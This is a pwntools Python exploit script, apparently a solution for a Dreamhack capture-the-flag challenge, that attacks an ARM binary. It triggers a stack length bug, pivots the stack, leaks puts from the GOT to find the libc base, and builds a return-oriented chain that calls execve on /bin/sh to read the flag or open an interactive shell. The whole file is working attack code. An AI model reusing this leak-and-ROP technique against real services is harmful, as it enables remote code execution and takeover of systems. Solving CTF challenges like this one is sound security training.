#!/usr/bin/env python3
from pwn import *
import re
import time

HOST = args.HOST or "host3.dreamhack.games"
PORT = int(args.PORT or 11485)

BIN_PATH = args.BIN or "./arm_training-last"
LIBC_PATH = args.LIBC or "./libc.so.6"

elf = context.binary = ELF(BIN_PATH, checksec=False)
libc = ELF(LIBC_PATH, checksec=False)

context.arch = "arm"
context.endian = "little"
context.log_level = "debug" if args.DEBUG else "info"

READLEN = 0x7e
TILDE_COUNT = 24

# Binary gadgets / callsites
POP_R3_PC = 0x10480
MOV_R0_R3_POP_R11_PC = 0x106e4
READ_TO_R11_MINUS_52 = 0x107e0
PUTS_CURRENT_R0_CALLSITE = 0x107d8

# Libc gadget offset
POP_R0_R1_R2_R3_PC_OFF = 0x151e08

PUTS_PLT = elf.plt["puts"]
PUTS_GOT = elf.got["puts"]

STAGE1 = 0x21e00
STAGE2 = STAGE1 + 0x50
BSS = STAGE2

LIBC_SYM = {
    name: libc.sym[name]
    for name in ["puts", "execve", "exit", "write"]
}
BINSH_OFF = next(libc.search(b"/bin/sh\x00"))


def barg(name, default=False):
    return bool(getattr(args, name, default))


def sarg(name, default=None):
    v = getattr(args, name, None)
    return v if v not in (None, "", False) else default


def iarg(name, default):
    v = sarg(name)
    return int(v) if v is not None else default


def to_bytes(x):
    if x is None:
        return None
    return x if isinstance(x, bytes) else str(x).encode()


def conn():
    if args.REMOTE:
        return remote(HOST, PORT)

    if args.QEMU:
        argv = ["qemu-arm"]

        if args.GDBPORT:
            argv += ["-g", str(args.GDBPORT)]

        if args.STRACE:
            argv.append("-strace")

        if args.QLOG:
            argv += ["-D", args.QLOG, "-d", "in_asm,exec"]

        argv += ["-L", args.LPREFIX or ".", BIN_PATH]
        return process(argv)

    return elf.process()


def stage_fill(ch=b"C"):
    return bytearray(ch * READLEN)


def arm_stack_length_bug(io):
    io.recvuntil(b"Are you ready?(y/n) ")
    io.sendline(b"y")

    io.recvuntil(b"Gooooo~\n")
    io.recvuntil(b"Press enter when you want to stop")

    for i in range(TILDE_COUNT):
        data = io.recvuntil(b"~", timeout=5)
        if not data.endswith(b"~"):
            raise RuntimeError(f"tilde sync timeout at {i + 1}/{TILDE_COUNT}")
        if args.DEBUG:
            log.debug(f"tilde {i + 1}/{TILDE_COUNT}")

    io.sendline()

    io.recvuntil(b"OK\n")
    io.recvuntil(b"Are you ready?(y/n) ")
    io.sendline(b"n")

    io.recvuntil(b"Give me all your ARM Power!!\n")


def build_stage0():
    return flat(
        b"A" * 48,
        p32(STAGE1 + 52),
        p32(READ_TO_R11_MINUS_52),
    ).ljust(READLEN, b"P")


def build_stage1():
    stage = stage_fill(b"B")

    # Byte controlling the following read length at 0x107dc path.
    stage[(STAGE2 - STAGE1) + 43] = READLEN

    # r3 = puts@got
    # r0 = r3
    # call real callsite: bl puts@plt; then continue into next read
    stage[48:52] = p32(0xDEADBEEF)
    stage[52:56] = p32(POP_R3_PC)
    stage[56:60] = p32(PUTS_GOT)
    stage[60:64] = p32(MOV_R0_R3_POP_R11_PC)
    stage[64:68] = p32(STAGE2 + 52)
    stage[68:72] = p32(PUTS_CURRENT_R0_CALLSITE)

    return bytes(stage)


def parse_puts_leak(io):
    leak_line = io.recvuntil(b"\n", drop=True, timeout=5)

    if len(leak_line) < 4:
        raise RuntimeError(f"bad puts leak: {leak_line!r}")

    puts_leak = u32(leak_line[:4])
    libc_base = puts_leak - LIBC_SYM["puts"]

    log.success(f"puts leak = {hex(puts_leak)}")
    log.success(f"libc base = {hex(libc_base)}")

    return libc_base


def laddr(libc_base, sym):
    return libc_base + LIBC_SYM[sym]


def build_execve_cmd(libc_base, command=b"/bin/cat /flag"):
    command = to_bytes(command)

    if len(command) + 1 > READLEN - 108:
        raise ValueError("command is too long for final 0x7e-byte read")

    pop_args = libc_base + POP_R0_R1_R2_R3_PC_OFF
    execve = laddr(libc_base, "execve")
    exit_ = laddr(libc_base, "exit")
    binsh = libc_base + BINSH_OFF

    argv = BSS + 80
    dash_c = BSS + 96
    cmd = BSS + 108
    envp = argv + 12

    log.info(f"pop args = {hex(pop_args)}")
    log.info(f"execve   = {hex(execve)}")
    log.info(f"/bin/sh  = {hex(binsh)}")
    log.info(f"command  = {command!r}")

    stage = stage_fill()

    # Stack epilogue -> pop {r0,r1,r2,r3,pc}
    stage[48:52] = p32(BSS + 104)
    stage[52:56] = p32(pop_args)

    # execve("/bin/sh", argv, envp)
    stage[56:60] = p32(binsh)
    stage[60:64] = p32(argv)
    stage[64:68] = p32(envp)
    stage[68:72] = p32(0)
    stage[72:76] = p32(execve)

    # argv = ["/bin/sh", "-c", command, NULL]
    stage[80:84] = p32(binsh)
    stage[84:88] = p32(dash_c)
    stage[88:92] = p32(cmd)
    stage[92:96] = p32(0)

    stage[96:99] = b"-c\x00"

    # fallback exit(0)
    stage[100:104] = p32(0)
    stage[104:108] = p32(exit_)

    stage[108:108 + len(command) + 1] = command + b"\x00"

    return bytes(stage)


def build_execve_shell(libc_base):
    pop_args = libc_base + POP_R0_R1_R2_R3_PC_OFF
    execve = laddr(libc_base, "execve")
    exit_ = laddr(libc_base, "exit")
    binsh = libc_base + BINSH_OFF

    argv = BSS + 80
    dash_i = BSS + 96
    envp = argv + 8

    log.info(f"pop args = {hex(pop_args)}")
    log.info(f"execve   = {hex(execve)}")
    log.info(f"/bin/sh  = {hex(binsh)}")

    stage = stage_fill()

    stage[48:52] = p32(BSS + 108)
    stage[52:56] = p32(pop_args)

    stage[56:60] = p32(binsh)
    stage[60:64] = p32(argv)
    stage[64:68] = p32(envp)
    stage[68:72] = p32(0)
    stage[72:76] = p32(execve)

    stage[80:84] = p32(binsh)
    stage[84:88] = p32(dash_i)
    stage[88:92] = p32(0)

    stage[96:99] = b"-i\x00"

    stage[104:108] = p32(0)
    stage[108:112] = p32(exit_)

    return bytes(stage)


def build_write_marker(libc_base):
    pop_args = libc_base + POP_R0_R1_R2_R3_PC_OFF
    write = laddr(libc_base, "write")
    exit_ = laddr(libc_base, "exit")
    marker = b"STAGE2_OK\n"

    stage = stage_fill()

    stage[48:52] = p32(BSS + 104)
    stage[52:56] = p32(pop_args)

    stage[56:60] = p32(1)
    stage[60:64] = p32(BSS + 80)
    stage[64:68] = p32(len(marker))
    stage[68:72] = p32(0)
    stage[72:76] = p32(write)

    stage[80:80 + len(marker)] = marker

    stage[100:104] = p32(0)
    stage[104:108] = p32(exit_)

    return bytes(stage)


def build_puts_marker(libc_base):
    exit_ = laddr(libc_base, "exit")
    marker = b"STAGE2_PUTS_OK\x00"

    stage = stage_fill()
    stage[0:len(marker)] = marker

    stage[48:52] = p32(0xDEADBEEF)
    stage[52:56] = p32(POP_R3_PC)
    stage[56:60] = p32(BSS)
    stage[60:64] = p32(MOV_R0_R3_POP_R11_PC)
    stage[64:68] = p32(BSS + 104)
    stage[68:72] = p32(PUTS_PLT)

    stage[100:104] = p32(0)
    stage[104:108] = p32(exit_)

    return bytes(stage)


def build_final_stage(libc_base):
    if args.BPUTS:
        log.info("stage2 mode: puts marker")
        return build_puts_marker(libc_base)

    if args.WRITE:
        log.info("stage2 mode: write marker")
        return build_write_marker(libc_base)

    if args.SHELL:
        log.info("stage2 mode: interactive shell")
        return build_execve_shell(libc_base)

    cmd = to_bytes(sarg("CMD", "/bin/cat /flag"))
    log.info("stage2 mode: execve sh -c command")
    return build_execve_cmd(libc_base, cmd)


def exploit_once():
    io = conn()

    try:
        arm_stack_length_bug(io)

        log.info("sending stage0 pivot")
        io.send(build_stage0())

        log.info("sending stage1 leak chain")
        io.send(build_stage1())

        libc_base = parse_puts_leak(io)

        log.info("sending stage2")
        io.send(build_final_stage(libc_base))

        if args.SHELL:
            cmd = to_bytes(sarg("CMD"))
            if cmd:
                io.sendline(cmd)
            io.interactive()
            return True

        recv_time = float(sarg("RECV", "2.0"))
        out = io.recvrepeat(recv_time)

        if out:
            text = out.decode(errors="replace")
            print(text, end="" if text.endswith("\n") else "\n")

        flag = re.search(rb"DH\{[^}\r\n]+\}", out or b"")
        if flag:
            log.success(f"flag = {flag.group().decode()}")
            return True

        if args.INTERACTIVE:
            io.interactive()
            return True

        return False

    finally:
        if not args.SHELL and not args.INTERACTIVE:
            io.close()


def main():
    tries = iarg("TRIES", 1)
    delay = float(sarg("DELAY", "0.5"))

    for attempt in range(1, tries + 1):
        try:
            if tries > 1:
                log.info(f"attempt {attempt}/{tries}")

            if exploit_once():
                return

        except Exception as e:
            log.warning(f"attempt {attempt} failed: {e}")

        if attempt != tries:
            time.sleep(delay)

    log.failure("exploit finished without confirmed flag")


if __name__ == "__main__":
    main()